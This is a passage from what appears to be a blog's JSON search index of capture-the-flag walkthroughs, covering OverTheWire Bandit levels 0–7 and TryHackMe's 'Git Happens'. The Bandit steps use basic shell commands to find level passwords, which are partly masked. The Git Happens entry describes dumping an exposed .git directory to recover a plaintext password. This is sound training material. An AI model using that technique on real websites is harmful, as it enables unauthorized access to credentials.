xgXsIYgqUCMriMoT7W2dSwTG1DCvbRvUbandit7@bandit:~$When we cat the file a large amount of text appears on the screen and keeps printing new lines for several seconds.What we do learn from this is the structure of the file &lt;WORD&gt; &lt;PASSWORD&gt; and that the file contains a large amount of text.We can check how many lines are in the file using the wc (Word Count)command.Using wc -l (-l for line) to count the number of lines in data.txt we can see that there is too many to search one by one.bandit7@bandit:~$ wc -l data.txt98567 data.txtAs the file has 98567 lines of text searching manually line by line will take too much time.We need a tool that can search for text within file.The grep (Global Regular Expression Print) command can be used to search files for specific words or string of text.Using grep we can find and print out the line containing the word millionth.bandit7@bandit:~$ lsdata.txtbandit7@bandit:~$ grep millionth data.txt millionth cvX2JJ##########################" }, { "title": "Tryhackme - Git Happens", "url": "/posts/tryhackme_githappens/", "categories": "tryhackme", "tags": "tryhackme, git", "date": "2021-11-02 22:30:00 +0000", "snippet": "Git HappensTryHackMe Room Link: Git HappensDescriptionBoss wanted me to create a prototype, so here it is! We even used something called “version control” that made deploying this really easy!Task 1 Capture the flagFind the Super Secret PasswordWalkthroughWe begin this challenge room by running a nmap scan to see what ports are open.From the nmap scan we can see 1 port open.Port 80 httpThe nmap scan also informs us that there is a .git directory on the website.Checking the website only shows a login screen When we test logging in with username admin and password admin nothing appears to happen. There is no error message.The nmap scan lists a .git directory lets check that now.We can see the folder structure of a git repository. We can check each folder and file individually but it is better to download the git repo and check it locally with git.To download the .git directory we can use GitTools. Lets clone the GitTools repository to our local machine Now that we have the tools we can download the .git directory.Now we can go into the newly created git folder and see what commits were made on this repository. Looking at the messages for the commits we can see that the site was made more secure with each commit applied. So we want to be looking at the early commits before any security was applied.We need to find a password so checking commits before any security was implemented is the best option. There are 2 commits availables Made the lgin page, boss! inital commitWe use the checkout command to revert the repository back to an earlier commit.Once the checkout is completed we now have 2 files and 1 directory.Let’s check what is in index.html.Scrolling through the html file we can see a login() at the end of the file and it contains the username and password in plaintext.Entering the password on tryhackme will complete the room." }, { "title": "Overthewire Bandit Level 6 -> 7", "url": "/posts/bandit07/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 22:27:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 6 -&gt; 7Level GoalThe password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in sizeWalkthroughLogin to the server using the password obtained from the previous level Bandit level 5 -&gt; 6.username: bandit6ssh bandit6@bandit.labs.overthewire.org -p 2220Similar to the previous level we need to use the find command to search for a file with specific properties.Use find again to search the whole server /Looking for files not directories -type fFiles owned by the user bandit7 -user bandit7Files owned by the group bandit6 -group bandit6Files with a size of 33 bytes -size 33c.bandit6@bandit:~$ find / -type f -user bandit7 -group bandit6 -size 33c/var/lib/dpkg/info/bandit7.passwordbandit6@bandit:~$ cat /var/lib/dpkg/info/bandit7.passwordHKBPTKQ##########################" }, { "title": "Overthewire Bandit Level 5 -> 6", "url": "/posts/bandit06/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 22:24:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 5 -&gt; 6Level GoalThe password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: human-readable 1033 bytes in size not executableWalkthroughLogin to the server using the password obtained from the previous level Bandit level 4 -&gt; 5.username: bandit5ssh bandit5@bandit.labs.overthewire.org -p 2220Running ls on the inhere directory will give us 20 more directories.Each of those directories contains multiple files.bandit5@bandit:~$ ls inhere/maybehere00 maybehere03 maybehere06 maybehere09 maybehere12 maybehere15 maybehere18maybehere01 maybehere04 maybehere07 maybehere10 maybehere13 maybehere16 maybehere19maybehere02 maybehere05 maybehere08 maybehere11 maybehere14 maybehere17bandit5@bandit:~$ ls inhere/maybehere00-file1 -file2 -file3 spaces file1 spaces file2 spaces file3We could run cat on each file but that would take a long time to complete.Instead we use the find command.The find command can be used to search for files or directories in a directory hierarchy.Using find with specific options we can narrow the search to find all files (-type f) of size 1033 bytes (-size 1033c) not executable (-not -executable).bandit5@bandit:~$ find ./inhere/ -type f -size 1033c -not -executable./inhere/maybehere07/.file2There is only 1 file with all 3 properties.As before cat the file to print its content to screen.bandit5@bandit:~$ cat ./inhere/maybehere07/.file2DXjZPU##########################" }, { "title": "Overthewire Bandit Level 4 -> 5", "url": "/posts/bandit05/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 22:20:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 4 -&gt; 5Level GoalThe password for the next level is stored in the only human-readable file in the inhere directory.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 3 -&gt; 4.username: bandit4ssh bandit4@bandit.labs.overthewire.org -p 2220We run ls inhere to see what files are in the inhere directory.bandit4@bandit:~$ ls inhere/-file00 -file01 -file02 -file03 -file04 -file05 -file06 -file07 -file08 -file09There are 10 files which have names that are not descriptive.We can use cat on each file to find the human readable file but can use another command to see what information is in each file without reading the contents.The file command can be used to find out what data is stored in a file.Now we use the file command to get information on each file in the inhere directory.bandit4@bandit:~$ file inhere/* inhere/-file00: data inhere/-file01: data inhere/-file02: datainhere/-file03: datainhere/-file04: data inhere/-file05: data inhere/-file06: datainhere/-file07: ASCII textinhere/-file08: datainhere/-file09: dataWe can see one file contains ASCII text which is human readable.Use cat command to print the contents of the file which is the password for the next level.bandit4@bandit:~$ cat ./inhere/-file07koReBO##########################" }, { "title": "Overthewire Bandit Level 3 -> 4", "url": "/posts/bandit04/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 22:15:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 3 -&gt; 4Level GoalThe password for the next level is stored in a hidden file in the inhere directory.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 2 -&gt; 3.username: bandit3ssh bandit3@bandit.labs.overthewire.org -p 2220Change directory into inhere, running ls command will show no files.bandit3@bandit:~$ lsinherebandit3@bandit:~$ cd inhere/bandit3@bandit:~/inhere$ ls Running ls -a will let us see all files including hidden files.-a for all files (do not ignore entries starting with .)We can then see a file named .hidden.The you can print to screen using cat command.bandit3@bandit:~/inhere$ ls -a. .. .hiddenbandit3@bandit:~/inhere$ cat ./.hiddenpIwrPr##########################" }, { "title": "Overthewire Bandit Level 2 -> 3", "url": "/posts/bandit03/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 22:05:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 2 -&gt; 3Level GoalThe password for the next level is stored in a file called spaces in this filename located in the home directoryWalkthroughLogin to the server using the password obtained from the previous level Bandit level 1 -&gt; 2.username: bandit2ssh bandit2@bandit.labs.overthewire.org -p 2220This time there is a file with spaces in the name.bandit2@bandit:~$ ls spaces in this filename Running cat spaces in the filename will cause errors as it will think each word in spaces in the filename is its own separate file.bandit2@bandit:~$ cat spaces in this filenamecat: spaces: No such file or directory cat: in: No such file or directory cat: this: No such file or directorycat: filename: No such file or directoryPrinting the contents of the file can be done 2 ways.One using \\ before each space to indicate to the terminal that the filename continues and the other is surrounding the file name with quotes ' or \".bandit2@bandit:~$ cat 'spaces in this filename'UmHadQ##########################bandit2@bandit:~$ cat spaces\\ in\\ this\\ filenameUmHadQ##########################" }, { "title": "Overthewire Bandit Level 1 -> 2", "url": "/posts/bandit02/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 20:46:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 1 -&gt; 2Level GoalThe password for the next level is stored in a file called - located in the home directoryWalkthroughLogin to the server using the password obtained from the previous level Bandit level 0 -&gt; 1.username: bandit1ssh bandit1@bandit.labs.overthewire.org -p 2220Running ls command we can see a single file with the name -.bandit1@bandit:~$ ls -Running cat - does not print the contents of the file - as the cat command thinks you are setting an option like -n for line numbers.We need to give the path to the file for the cat command to print the contents.bandit1@bandit:~$ cat ./- CV1Dtq##########################" }, { "title": "Overthewire Bandit Level 0 -> 1", "url": "/posts/bandit01/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2021-11-02 20:41:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 0 -&gt; 1Level GoalThe password for the next level is stored in a file called readme located in the home directory.Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH (on port 2220) to log into that level and continue the game.WalkthroughLogin to the server using the provided username and password.username: bandit0password: bandit0ssh bandit0@bandit.labs.overthewire.org -p 2220Enter the password when prompted to login to the level.The Level Goal states the password for the next level in the file readme.Reading the contents of readme to get the password.There are multiple ways to read the contents of a file less and cat are two ways.less will display the contents of the file in a paginated style which is good for viewing large files.cat on the other hand will display all the contents of the file to the screen without using pagination.bandit0@bandit:~$ lsreadmebandit0@bandit:~$ cat readme boJ9jb##########################" } ]
